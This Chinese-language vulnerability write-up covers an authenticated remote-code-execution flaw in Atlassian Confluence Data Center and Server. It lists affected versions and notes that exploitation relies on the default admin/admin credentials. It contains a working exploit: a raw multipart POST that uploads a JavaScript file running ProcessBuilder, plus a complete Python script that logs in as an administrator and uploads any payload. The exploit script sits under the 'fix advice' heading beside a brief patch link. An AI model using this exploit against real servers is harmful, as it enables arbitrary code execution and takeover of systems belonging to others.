**漏洞介绍**

Atlassian Confluence是澳大利亚Atlassian公司的一套专业的企业知识管理与协同软件，也可以用于构建企业WiKi。

Atlassian Confluence Data Center and Server存在安全漏洞，该漏洞源于存在远程代码执行问题，允许经过身份验证的攻击者执行任意代码。

**影响版本**

1、 Data Center == 8.9.0 

2、 8.8.0 <= Data Center <= 8.8.1 

3、 8.7.0 <= Data Center <= 8.7.2 

4、 8.6.0 <= Data Center <= 8.6.2 

5、 8.5.0 <= Data Center <= 8.5.8 LTS 

6、 8.4.0 <= Data Center <= 8.4.5 

7、 8.3.0 <= Data Center <= 8.3.4 

8、 8.2.0 <= Data Center <= 8.2.3 

9、 8.1.0 <= Data Center <= 8.1.4 

10、 8.0.0 <= Data Center <= 8.0.4 

11、 7.20.0 <= Data Center <= 7.20.3 

12、 7.19.0 <= Data Center <= 7.19.21 LTS 

13、 7.18.0 <= Data Center <= 7.18.3 

14、 7.17.0 <= Data Center <= 7.17.5 

15、 8.5.0 <= Server <= 8.5.8 LTS 

16、 8.4.0 <= Server <= 8.4.5 

17、 8.3.0 <= Server <= 8.3.4 

18、 8.2.0 <= Server <= 8.2.3 

19、 8.1.0 <= Server <= 8.1.4 

20、 8.0.0 <= Server <= 8.0.4 

21、 7.20.0 <= Server <= 7.20.3 

22、 7.19.0 <= Server <= 7.19.21 LTS 

23、 7.18.0 <= Server <= 7.18.3 

24、 7.17.0 <= Server <= 7.17.5

利用需要默认admin/admin登录

**漏洞复现**

漏洞复现（反弹shell）

 **POC （POST）**

```yaml

POST /admin/plugins/newcode/addlanguage.action HTTP/1.1
Host: 172.17.151.129:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 459
Content-Type: multipart/form-data; boundary=690dd62eb49730d16f0a919d8736b152

--690dd62eb49730d16f0a919d8736b152
Content-Disposition: form-data; name="atl_token"

tockenxxxx
--690dd62eb49730d16f0a919d8736b152
Content-Disposition: form-data; name="newLanguageName"

test
--690dd62eb49730d16f0a919d8736b152
Content-Disposition: form-data; name="languageFile"; filename="exploit.js"
Content-Type: text/javascript

new java.lang.ProcessBuilder["(java.lang.String[])"](["calc.exe"]).start()
--690dd62eb49730d16f0a919d8736b152--
```

js执行payload

```
new java.lang.ProcessBuilder["(java.lang.String[])"](["calc.exe"]).start()
```



**修复建议**

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://confluence.atlassian.com/pages/viewpage.action?pageId=1387867145https://github.com/W01fh4cker/CVE-2024-21683-RCEhttps://ti.qianxin.com/vulnerability/detail/353479
```

```python

import click
import requests

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"


def login(session: requests.Session, url: str, username: str, password: str) -> None:
    data = f"os_username={username}&os_password={password}&login=Log+in&os_destination=%2Findex.action"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(url=url, headers=headers, data=data, verify=False)

    if "the following error(s) occurred" in response.text.lower():
        raise ValueError("Incorrect user or password")

    if response.status_code != 200:
        raise ValueError("Unknown error")


def do_authenticate(
    session: requests.Session, url: str, username: str, password: str
) -> None:
    data = f"password={password}&authenticate=Confirm&destination=%2Fadmin%2Fconsole.action"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = session.post(url=url, headers=headers, data=data, verify=False)

    if "the following error(s) occurred" in response.text.lower():
        raise ValueError("Incorrect user or password")

    if response.status_code != 200:
        raise ValueError("Unknown error")


def upload_macros(
    session: requests.Session, url: str, macro_name: str, payload: str
) -> None:
    data = {"newLanguageName": "MyNewLanguage"}

    files = {"languageFile": (macro_name, payload, "text/javascript")}

    response = session.post(url, data=data, files=files, verify=False)

    if response.status_code != 200:
        raise ValueError("Unknown error")


@click.command()
@click.option(
    "--user",
    "-u",
    help="Username of user with system administration privelege. Example: admin",
)
@click.option(
    "--password",
    "-p",
    help="Password of user with system administration privelege. Example: admin",
)
@click.option("--target", "-t", help="URL confluence. Example: http://127.0.0.1:8090")
@click.option("--file", "-f", help="File payload. Example: exp.js")
@click.option("--name", "-n", default="test", help="New language name. Example: test")
def main(user: str, password: str, target: str, file: str, name: str):
    sess = requests.Session()
    sess.headers.update({"User-Agent": USER_AGENT, "X-Atlassian-Token": "no-check"})

    login(
        session=sess, url=f"{target}/dologin.action", username=user, password=password
    )
    do_authenticate(
        session=sess,
        url=f"{target}/doauthenticate.action",
        username=user,
        password=password,
    )

    with open(file, "rt") as fd:
        payload = fd.read()

    upload_macros(
        session=sess,
        url=f"{target}/admin/plugins/newcode/addlanguage.action",
        macro_name=name,
        payload=payload,
    )


if __name__ == "__main__":
    main()
```

